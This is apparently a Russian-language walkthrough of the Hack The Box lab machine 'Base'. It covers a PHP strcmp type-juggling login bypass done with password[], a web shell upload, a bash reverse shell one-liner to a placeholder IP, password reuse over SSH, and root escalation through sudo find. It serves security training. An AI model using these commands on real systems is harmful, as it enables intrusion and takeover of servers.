# HTB Starting Point Tier 2: Base

- **Difficulty:** Very Easy
- **Дата:** 15.01.2026
- **Цель:** Практика работы с Burp, перехват и изменение запросов, веб-шелл

## 1. Recon & Enumeration
- Nmap `nmap -sC -sV -v -T4 $ip`, получаем 2 открытых порта `22 (SSH)`, `80 (HTTP)`
- Переходим на `http://ip:80`, нам открывается главная страница условного файлового хостинга, предполагаю, что тут мы будем заливать обратный шелл на сервер. В правом верхнем углу сразу видим кнопку логина, нажимаем и попадаем на форму ввода логина и пароля: `http://ip/login/login.php`. Попробовал дефолтные креды, ничего не подошло, идем дальше.
- Попробуем перечилислить каталоги, которые могут быть полезные, в любом случае нам надо искать путь, в котором будут храниться загруженные нами файлы. И так, начинаем с простого фазинга каталогов: `ffuf -u http://ip/FUZZ -w ../common.txt`, находим `/login` каталог. Переходим по нему, и обнаруживаем 3 файла: один из которых пустой, второй это форма логина, и есть файл с расширеним `.swp`. Гуглим. Расширение .swp (Swap file) чаще всего относится к временным файлам подкачки, которые создаются текстовыми редакторами (особенно Vim) для сохранения несохранённых изменений на случай сбоя, или к файлам подкачки (Swap) операционной системы, используемым для расширения оперативной памяти. Читаем файл, находим в нем PHP форму, и в частности функцию: `strcmp()`, которая используется для сравнения введенных пользователем имени пользователя и пароля с действительными именем пользователя и паролем.
- Гуглим дальше, `strcmp php vulnerability`, и вот тут находим явную уязвимость `Type Juggling`. Эта уязвимость часто приводит к уязвимостям вроде обхода аутентификации; то, что нам и нужно. Изучая функцию strcmp и ее уязвимости нахожу статью в которой автор утверждает, что мы можем обойти аунтификацию, отправив пустой массив. Выходит, что нам нужно добиться того, чтобы PHP стал интерпретировать пароль как пустой массив - `[]`, а не как строку, и функция strcmp() получила массив, не смогла его обработать, вернула значение NULL, так как в коде использовалось `==` вместо `===`.
- **UPD.** Перечисляем каталоги, где должны лежать файлы, загруженнные нами из страницы `/upload.php`. Если на прошлом этапе, когда мы проходились по common словарику, не нашли каталог файлов, значит нужно брать словарик побольше. Воспользуемся дефолтным словарем, который уже предустановлен в Kali: `/usr/share/wordlists/dirb/big.txt`, и почти сразу же находим `/_uploaded`, вероятнее всего это и есть каталог, куда попадают наши файлы.

## 2. Exploitation
- И так, собрав все вводные данные в кучу, идем в Burp перехватывать запрос, и менять строку с паролем. Переходим снова на страницу с логином в системе `http://ip/login/login.php`, включаем перехват и вводим тестовые креды: `admin&pass`, в перехваченном запросе получаем строку: `username=admin&password=pass`, и теперь, если верить автору из статьи выше, мы отправим пустой массив, что его получаила функция strcmp, то нас пробросит внутрь системы, чтож, давайте пробовать.
- Изменяем запрос с `username=admin&password=pass` на `username=admin&password[]=pass` и форвардим его, пока нас не пустит в систему, и.. сработало! Мы попали на страничку `/upload.php`, где мы можем загружать файлы на сервер. Значит, нам нужно вернуться к этапу перечисления, чтобы найти каталог, где хранятся, загруженные нами, файлы. Пробуем загрузить тестовый файл, и да, он попадает в `/_uploaded`.
- Будем использовать webshell, который лежит в нашей Kali: `/usr/share/webshells/php/simple-backdoor.php`, загружаем его через нашу форму, переходим в `/_uploaded`, вебшелл на месте, проверяем его работоспособность: `http://ip/_uploaded/simple-backdoor.php?cmd=whoami`, старница нам возвращает www-data, успех!
- Теперь вместо `whoami` используем следующую полезную нагрузку: `/bin/bash -c 'bash -i >& /dev/tcp/YOUR_IP_ADDRESS/LISTENING_PORT 0>&1'`, единственное нам нужно преобразовать ее в URL формат, сделать это можно в Burp во вкладке `Decoder`, вставляем нашу полезную нагрзуку выбираем `Encode as URL`, и получаем готовую строку, которую вставляем вместо whoami:
- Запускаем слушателя: `nc -lvnp 7777`, собираем все в кучу в URL строке, оправлям и получаем ответ в треминале, мы `www-data`!
- В домашнем каталоге находим пользователя john. А также вернемся к, ранее найденому, файлу `config.php`, который находится по пути: `/var/www/html/login`, читаем файл и находим креды админа.
- Облазив все вдоль и поперек, идея попробовать зареюзать пароль админа к пользаветелю john была последней, пробуем подключаться по ssh, как ни странно, но успех!

## 3. Privilege Escalation
- Начинаем с `sudo -l`, и тут сразу же все становится понятно: `(root : root) /usr/bin/find`, идем искать ответы на [GTFOBins](https://gtfobins.github.io/gtfobins/find/) находим команду `sudo find . -exec /bin/sh \; -quit` выполняем ее и мы root-пользователь! Осталось собрать флаги, и отправить на проверку.

## Done
Тачка действительно легкая, единственнай момент, который немного выбил из колеи - это функция PHP strcmp(), а в частности отправка пустого массива. Ранее с этим не был знаком, поэтому пришлось много гуглить.
